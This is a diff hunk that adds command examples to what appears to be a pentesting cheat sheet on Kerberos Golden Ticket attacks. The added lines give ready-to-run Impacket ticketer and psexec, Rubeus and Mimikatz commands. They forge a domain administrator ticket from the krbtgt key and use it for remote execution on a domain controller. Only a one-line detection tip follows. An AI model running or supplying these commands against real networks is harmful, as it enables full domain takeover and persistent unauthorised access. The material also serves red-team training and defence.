@@ -21,3 +21,22 @@ Forge a **TGT** with the `krbtgt` key: any user, any group, any lifetime. Surviv
 
 ### Exhaustive commands
 ```bash
+# ── Impacket ticketer ────────────────────────────────────────────────
+impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-X \
+  -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+
+# ── Rubeus (AES256 preferred) ────────────────────────────────────────
+Rubeus.exe golden /aes256:<key> /user:Administrator \
+  /domain:corp.local /sid:S-1-5-21-X /ptt
+
+# ── Mimikatz ─────────────────────────────────────────────────────────
+kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-X /krbtgt:<hash> /ptt
+```
+
+### Detection
+**4769 without 4768**; TGT lifetime > domain policy; `krbtgt` password age anomaly; rotate **twice**.
+
+---
